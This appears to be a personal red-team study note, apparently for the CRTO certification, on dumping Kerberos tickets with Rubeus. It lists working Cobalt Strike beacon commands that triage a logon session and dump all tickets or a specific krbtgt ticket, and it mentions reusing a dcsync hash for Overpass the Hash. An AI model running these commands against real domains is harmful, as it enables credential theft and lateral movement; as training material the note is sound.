
[[Kerberos]] tickets can help an attacker perform malicious actions like Kerberoasting, lateral movement, generate more tickets, etc.

These actions can cause a lot of noise though.

### 🖊️ via [Rubeus](https://github.com/GhostPack/Rubeus)

Uses legitimate Windows APIs, reducing the noise.

- Its `triage` command will list all the Kerberos tickets in your current logon session and if elevated, from all logon sessions on the machine.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`

![[kerberos_sessions.png]]

LUID (local unique identifier) is the logon session identifier. 
krbtgt - [[Ticket Granting Ticket (TGT)]] tickets
All others are [[Ticket Granting Service (TGS)]] tickets

- Once listed, you can extract them all or specific tickets from a session

All tickets
`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump`

A specific ticket
`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt`

This will output the ticket(s) in base64 encoded format.

  You may also add the `/nowrap` option which will format the base64 encoding onto a single line - this makes copy & pasting much easier.
  
### ⚠ Rubeus + NTLM hash

If you have the NTLM or AES (can be extracted via [[dcsync]]) hash of a user, you can request a new TGT for that user, using the technique [[Overpass the Hash]]. 

### Properties
---
📆 created   {{11-02-2024}} 12:00
🏷️ tags: #redteam #crto #activedirectory 

---

